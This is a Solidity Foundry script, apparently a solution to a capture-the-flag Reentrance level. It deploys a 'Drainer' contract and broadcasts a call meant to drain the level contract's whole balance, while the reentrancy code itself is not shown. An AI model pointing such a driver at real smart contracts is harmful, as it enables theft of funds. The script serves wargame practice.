// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel10.sol";
import "../src/level10.sol";

contract Attacker is Script {
    Reentrance level10 = Reentrance(payable(0x4f8c95cB88D378d982A611D7e761251039b5Be76));

    function run() external {
        uint256 balance = address(level10).balance;

        vm.startBroadcast();

        Drainer drainer = new Drainer();
        drainer.attack{value: balance}();

        vm.stopBroadcast();
    }
}
